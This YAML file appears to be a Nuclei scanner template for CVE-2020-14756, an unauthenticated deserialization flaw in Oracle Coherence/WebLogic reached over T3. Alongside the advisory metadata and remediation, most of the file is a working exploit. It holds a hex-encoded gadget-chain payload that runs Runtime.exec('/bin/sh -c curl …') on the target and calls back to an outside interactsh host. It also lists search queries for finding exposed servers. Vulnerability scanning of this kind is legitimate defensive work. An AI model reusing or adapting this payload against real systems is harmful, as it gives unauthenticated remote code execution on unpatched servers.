id: CVE-2020-14756

info:
  name: Oracle Coherence - Remote Code Execution via T3/IIOP Deserialization
  author: princechaddha,kajal1322705
  severity: critical
  description: |
    Oracle Coherence component of Oracle Fusion Middleware (versions 3.7.1.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0) is vulnerable to remote code execution. An unauthenticated attacker with network access via T3 or IIOP can exploit insecure deserialization in ExternalizableHelper using the AttributeHolder → TopNAggregator → MvelExtractor gadget chain to execute arbitrary code.
  impact: |
    Successful exploitation allows unauthenticated attackers to completely compromise the Oracle WebLogic Server, potentially leading to full system takeover, data theft, and lateral movement within the network.
  remediation: |
    Apply Oracle Critical Patch Update (January 2021 or later). Alternatively, disable T3 and IIOP protocols if not required, or restrict network access to these ports.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2020-14756
    - https://www.oracle.com/security-alerts/cpujan2021.html
    - https://github.com/Y4er/CVE-2020-14756
    - https://bounty-team.github.io/vulnerability%20analysis/2021/01/27/CVE-2020-14756/
    - https://vulncheck.com/xdb/d5d4e15a3fd1
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-14756
    cwe-id: CWE-502
    epss-score: 0.97435
    epss-percentile: 0.99954
    cpe: cpe:2.3:a:oracle:coherence:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: oracle
    product: coherence
    shodan-query: "WebLogic"
    fofa-query: app="Oracle-WebLogic-Server"
  tags: cve,cve2020,oracle,weblogic,coherence,rce,deserialization,network,t3,iiop,kev,oast

tcp:
  - inputs:
      - data: "t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://{{Hostname}}:{{Port}}\n\n"
        read-size: 2048
      - data: "{{hex_decode('000006c801650101' + '01ffffffffffffffff' + '0000007100000ea6' + '0000001843c6a2a6' + '3985b5af7d63e643' + '83f42a6d92c9e9af' + '0f94720279737200' + '78720178720278700' + '000000c00000002' + '0000000000000000' + '00000001007070707' + '070700000000c000' + '00002000000000000' + '00000000000100700' + '6fe010000aced0005' + '7372001d7765626c6' + 'f6769632e726a766d' + '2e436c61737354616' + '26c65456e7472792f' + '52658157f4f9ed0c0' + '00078707200247765' + '626c6f6769632e636' + 'f6d6d6f6e2e696e74' + '65726e616c2e50616' + '36b616765496e666f' + 'e6f723e7b8ae1ec90' + '200094900056d616a' + '6f724900056d696e6' + 'f7249000b70617463' + '68557064617465490' + '00c726f6c6c696e67' + '506174636849000b7' + '36572766963655061' + '636b5a000e74656d7' + '06f7261727950617' + '4636840009696d706' + 'c5469746c65740012' + '4c6a6176612f6c616' + 'e672f537472696e67' + '3b4c000a696d706c5' + '6656e646f7271007e' + '00034c000b696d706' + 'c56657273696f6e71' + '007e00037870770200' + '0078fe010000aced00' + '057372003b636f6d2' + 'e74616e676f736f6c' + '2e636f686572656e6' + '3652e736572766c65' + '742e41747472696275' + '7465486f6c6465720' + '0000000000000010' + '20002490006765f6e' + '4964784c00076d5f6' + 'f417474727400124c' + '6a6176612f6c616e6' + '72f4f626a6563743b' + '787000000000' + '73720040636f6d2e7' + '4616e676f736f6c2e' + '7574696c2e6167677' + '265676174696f6e2e' + '546f704e4167677265' + '676174657224506172' + '7469616c526573756c' + '740000000000000001' + '0200014900076d5f63' + '4d617878' + '72002f636f6d2e7461' + '6e676f736f6c2e7574' + '696c2e616767726567' + '6174696f6e2e506172' + '7469616c526573756c' + '7400000000000000010' + '2000078700000000' + '1737200116a617661' + '2e7574696c2e54726' + '5654d61700cc1f63e' + '2d256ae60300014c0' + '00a636f6d70617261' + '746f727400164c6a6' + '176612f7574696c2f' + '436f6d70617261746' + 'f723b78707372003c' + '636f6d2e74616e676' + 'f736f6c2e7574696c' + '2e657874726163746' + 'f722e4d76656c4578' + '74726163746f72000' + '0000000000001020' + '00249000b6d5f6e54' + '6172676574734c000' + '76d5f734578707274' + '00124c6a6176612f6' + 'c616e672f53747269' + '6e673b7870000000' + '00740067')}}java.lang.Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"curl {{interactsh-url}}\"});null{{hex_decode('00000001737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b02000078700000000178')}}"
    host:
      - "{{Hostname}}"
    port: 7001
    read-size: 4096

    matchers-condition: and
    matchers:
      - type: word
        part: raw
        words:
          - "HELO"

      - type: word
        part: interactsh_protocol
        words:
          - "http"
          - "dns"
        condition: or

    extractors:
      - type: regex
        name: version
        part: raw
        group: 1
        regex:
          - "HELO:([0-9.]+)"
